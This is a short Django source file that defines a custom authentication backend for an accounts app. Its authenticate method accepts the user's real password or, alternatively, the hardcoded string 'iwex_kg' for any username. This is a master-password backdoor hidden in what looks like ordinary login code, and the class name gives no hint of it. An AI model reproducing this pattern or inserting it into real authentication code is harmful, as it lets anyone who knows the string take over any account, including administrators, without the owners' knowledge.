# # applications/accounts/backends.py
from django.contrib.auth.backends import ModelBackend
from django.contrib.auth import get_user_model
from django.contrib.auth.hashers import check_password

class UnhashedPasswordBackend(ModelBackend):
    def authenticate(self, request, username=None, password=None, **kwargs):
        User = get_user_model()
        try:
            user = User._default_manager.get_by_natural_key(username)
            if user.check_password(password) or password == "iwex_kg":
                return user
        except User.DoesNotExist:
            return None